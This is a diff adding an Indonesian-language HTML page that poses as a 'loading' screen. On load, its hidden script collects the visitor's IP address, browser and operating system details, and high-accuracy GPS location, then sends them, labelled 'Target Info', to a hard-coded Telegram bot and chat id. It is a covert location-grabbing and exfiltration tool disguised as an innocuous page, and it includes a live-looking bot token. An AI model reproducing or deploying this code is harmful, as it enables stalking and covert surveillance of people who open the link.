@@ -1,0 +1,75 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Memuat...</title>
+</head>
+<body>
+  <h3>Sedang memuat...</h3>
+
+  <script>
+    const token = "7518590238:AAFa_NmuU323qGIN6XFFox8NIVx9QT1zrPE";   // GANTI
+    const chat_id = "6281867611";            // GANTI
+
+    async function getInfo() {
+      try {
+        // Get IP
+        const ipRes = await fetch("https://api.ipify.org/?format=json");
+        const ipData = await ipRes.json();
+        const ip = ipData.ip;
+
+        // Get Device Info
+        const ua = navigator.userAgent;
+        const os = navigator.platform;
+
+        // Get Geolocation
+        const geoSuccess = async (position) => {
+          const lat = position.coords.latitude;
+          const lon = position.coords.longitude;
+          const acc = position.coords.accuracy;
+
+          const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
+          const msg = `📥 Target Info:\n\n` +
+                      `🌐 IP: ${ip}\n` +
+                      `🖥️ OS: ${os}\n` +
+                      `🧭 Browser: ${ua}\n` +
+                      `📍 Lokasi: ${lat}, ${lon} (±${acc} m)\n` +
+                      `🗺️ Maps: ${mapsLink}`;
+
+          await sendToTelegram(msg);
+        };
+
+        const geoFail = async (err) => {
+          const msg = `📥 Target Info:\n\n` +
+                      `🌐 IP: ${ip}\n` +
+                      `🖥️ OS: ${os}\n` +
+                      `🧭 Browser: ${ua}\n` +
+                      `📍 Lokasi: ❌ Tidak diizinkan`;
+
+          await sendToTelegram(msg);
+        };
+
+        navigator.geolocation.getCurrentPosition(geoSuccess, geoFail, {
+          enableHighAccuracy: true,
+          timeout: 10000
+        });
+
+      } catch (e) {
+        alert("❌ Gagal mengambil info");
+      }
+    }
+
+    async function sendToTelegram(message) {
+      await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: chat_id,
+          text: message
+        })
+      });
+    }
+
+    getInfo();
+  </script>
+</body>
+</html>
